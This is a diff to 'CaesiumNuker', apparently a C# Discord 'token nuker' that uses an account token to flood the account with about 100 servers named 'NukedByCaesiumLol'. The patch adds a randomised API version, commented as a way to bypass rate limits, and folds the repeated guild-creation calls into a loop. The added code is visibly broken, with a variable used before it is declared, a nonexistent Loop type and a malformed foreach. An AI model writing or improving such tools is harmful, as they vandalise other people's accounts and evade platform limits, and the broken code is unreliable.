@@ -7,7 +7,8 @@ using System.Net.Http;
 using Newtonsoft.Json;
 using Discord;
 using System.Threading;
-
+int api  = rnd.Next(6, 9);  // random api version to bypass ratelimits between api versions
+Random rnd = new Random();
 namespace CaesiumNuker
 {
     internal class Program
@@ -49,7 +50,7 @@ namespace CaesiumNuker
 
             static void Main(string[] args)
         {
-            Console.Title = "Caesium Token Nuker";
+            Console.Title = "\\ Caesium! // ";
             //Logo
             string ascii = @" ▄████▄   ▄▄▄      ▓█████   ██████  ██▓ █    ██  ███▄ ▄███▓
 ▒██▀ ▀█  ▒████▄    ▓█   ▀ ▒██    ▒ ▓██▒ ██  ▓██▒▓██▒▀█▀ ██▒
@@ -136,107 +137,14 @@ namespace CaesiumNuker
                 {
 
 
-                    //Creating guilds, sorry for shit code
-                    client.CreateGuild("NukedByCaesiumLol", null, null);
-                    client.CreateGuild("NukedByCaesiumLol", null, null);
-                    client.CreateGuild("NukedByCaesiumLol", null, null);
-                    client.CreateGuild("NukedByCaesiumLol", null, null);
-                    client.CreateGuild("NukedByCaesiumLol", null, null);
-                    client.CreateGuild("NukedByCaesiumLol", null, null);
-                    client.CreateGuild("NukedByCaesiumLol", null, null);
-                    client.CreateGuild("NukedByCaesiumLol", null, null);
-                    client.CreateGuild("NukedByCaesiumLol", null, null);
-                    client.CreateGuild("NukedByCaesiumLol", null, null);
-                    client.CreateGuild("NukedByCaesiumLol", null, null);
-                    client.CreateGuild("NukedByCaesiumLol", null, null);
-                    client.CreateGuild("NukedByCaesiumLol", null, null);
-                    client.CreateGuild("NukedByCaesiumLol", null, null);
-                    client.CreateGuild("NukedByCaesiumLol", null, null);
-                    client.CreateGuild("NukedByCaesiumLol", null, null);
-                    client.CreateGuild("NukedByCaesiumLol", null, null);
-                    client.CreateGuild("NukedByCaesiumLol", null, null);
-                    client.CreateGuild("NukedByCaesiumLol", null, null);
-                    client.CreateGuild("NukedByCaesiumLol", null, null);
-                    client.CreateGuild("NukedByCaesiumLol", null, null);
-                    client.CreateGuild("NukedByCaesiumLol", null, null);
-                    client.CreateGuild("NukedByCaesiumLol", null, null);
-                    client.CreateGuild("NukedByCaesiumLol", null, null);
-                    client.CreateGuild("NukedByCaesiumLol", null, null);
-                    client.CreateGuild("NukedByCaesiumLol", null, null);
-                    client.CreateGuild("NukedByCaesiumLol", null, null);
-                    client.CreateGuild("NukedByCaesiumLol", null, null);
-                    client.CreateGuild("NukedByCaesiumLol", null, null);
-                    client.CreateGuild("NukedByCaesiumLol", null, null);
-                    client.CreateGuild("NukedByCaesiumLol", null, null);
-                    client.CreateGuild("NukedByCaesiumLol", null, null);
-                    client.CreateGuild("NukedByCaesiumLol", null, null);
-                    client.CreateGuild("NukedByCaesiumLol", null, null);
-                    client.CreateGuild("NukedByCaesiumLol", null, null);
-                    client.CreateGuild("NukedByCaesiumLol", null, null);
-                    client.CreateGuild("NukedByCaesiumLol", null, null);
-                    client.CreateGuild("NukedByCaesiumLol", null, null);
-                    client.CreateGuild("NukedByCaesiumLol", null, null);
-                    client.CreateGuild("NukedByCaesiumLol", null, null);
-                    client.CreateGuild("NukedByCaesiumLol", null, null);
-                    client.CreateGuild("NukedByCaesiumLol", null, null);
-                    client.CreateGuild("NukedByCaesiumLol", null, null);
-                    client.CreateGuild("NukedByCaesiumLol", null, null);
-                    client.CreateGuild("NukedByCaesiumLol", null, null);
-                    client.CreateGuild("NukedByCaesiumLol", null, null);
-                    client.CreateGuild("NukedByCaesiumLol", null, null);
-                    client.CreateGuild("NukedByCaesiumLol", null, null);
-                    client.CreateGuild("NukedByCaesiumLol", null, null);
-                    client.CreateGuild("NukedByCaesiumLol", null, null);
-                    client.CreateGuild("NukedByCaesiumLol", null, null);
-                    client.CreateGuild("NukedByCaesiumLol", null, null);
-                    client.CreateGuild("NukedByCaesiumLol", null, null);
-                    client.CreateGuild("NukedByCaesiumLol", null, null);
-                    client.CreateGuild("NukedByCaesiumLol", null, null);
-                    client.CreateGuild("NukedByCaesiumLol", null, null);
-                    client.CreateGuild("NukedByCaesiumLol", null, null);
-                    client.CreateGuild("NukedByCaesiumLol", null, null);
-                    client.CreateGuild("NukedByCaesiumLol", null, null);
-                    client.CreateGuild("NukedByCaesiumLol", null, null);
-                    client.CreateGuild("NukedByCaesiumLol", null, null);
-                    client.CreateGuild("NukedByCaesiumLol", null, null);
-                    client.CreateGuild("NukedByCaesiumLol", null, null);
-                    client.CreateGuild("NukedByCaesiumLol", null, null);
-                    client.CreateGuild("NukedByCaesiumLol", null, null);
-                    client.CreateGuild("NukedByCaesiumLol", null, null);
-                    client.CreateGuild("NukedByCaesiumLol", null, null);
-                    client.CreateGuild("NukedByCaesiumLol", null, null);
-                    client.CreateGuild("NukedByCaesiumLol", null, null);
-                    client.CreateGuild("NukedByCaesiumLol", null, null);
-                    client.CreateGuild("NukedByCaesiumLol", null, null);
-                    client.CreateGuild("NukedByCaesiumLol", null, null);
-                    client.CreateGuild("NukedByCaesiumLol", null, null);
-                    client.CreateGuild("NukedByCaesiumLol", null, null);
-                    client.CreateGuild("NukedByCaesiumLol", null, null);
-                    client.CreateGuild("NukedByCaesiumLol", null, null);
-                    client.CreateGuild("NukedByCaesiumLol", null, null);
-                    client.CreateGuild("NukedByCaesiumLol", null, null);
-                    client.CreateGuild("NukedByCaesiumLol", null, null);
-                    client.CreateGuild("NukedByCaesiumLol", null, null);
-                    client.CreateGuild("NukedByCaesiumLol", null, null);
-                    client.CreateGuild("NukedByCaesiumLol", null, null);
-                    client.CreateGuild("NukedByCaesiumLol", null, null);
-                    client.CreateGuild("NukedByCaesiumLol", null, null);
-                    client.CreateGuild("NukedByCaesiumLol", null, null);
-                    client.CreateGuild("NukedByCaesiumLol", null, null);
-                    client.CreateGuild("NukedByCaesiumLol", null, null);
-                    client.CreateGuild("NukedByCaesiumLol", null, null);
-                    client.CreateGuild("NukedByCaesiumLol", null, null);
-                    client.CreateGuild("NukedByCaesiumLol", null, null);
-                    client.CreateGuild("NukedByCaesiumLol", null, null);
-                    client.CreateGuild("NukedByCaesiumLol", null, null);
-                    client.CreateGuild("NukedByCaesiumLol", null, null);
-                    client.CreateGuild("NukedByCaesiumLol", null, null);
-                    client.CreateGuild("NukedByCaesiumLol", null, null);
-                    client.CreateGuild("NukedByCaesiumLol", null, null);
-                    client.CreateGuild("NukedByCaesiumLol", null, null);
-                    client.CreateGuild("NukedByCaesiumLol", null, null);
-                    client.CreateGuild("NukedByCaesiumLol", null, null);
-                    client.CreateGuild("NukedByCaesiumLol", null, null);
+                                //Creating guilds
+            var loop = new Loop(100);
+                        foreach(var index loop) {
+                            client.CreateGuild("NukedByCaesiumLol", null, null);
+
+                        }
+                    
+                   
 
                     Console.WriteLine("Creating Guilds...");
 
